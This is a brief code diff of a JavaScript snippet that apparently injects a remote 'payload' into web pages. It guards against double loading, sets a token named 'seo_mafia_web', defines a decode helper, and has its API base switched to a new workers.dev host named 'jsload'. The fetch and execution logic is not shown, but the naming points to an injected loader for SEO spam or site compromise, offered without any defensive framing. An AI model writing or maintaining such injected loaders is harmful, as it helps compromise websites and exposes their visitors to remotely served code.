@@ -2,7 +2,7 @@
 try{
   if(document.getElementById("bunker-payload-2")) return;
 
-  const API_BASE = "https://smw-queryjs.data-deliver.workers.dev";
+  const API_BASE = "https://smw.jsload.workers.dev";
   const TOKEN = "seo_mafia_web";
 
   const decode = (s) => {
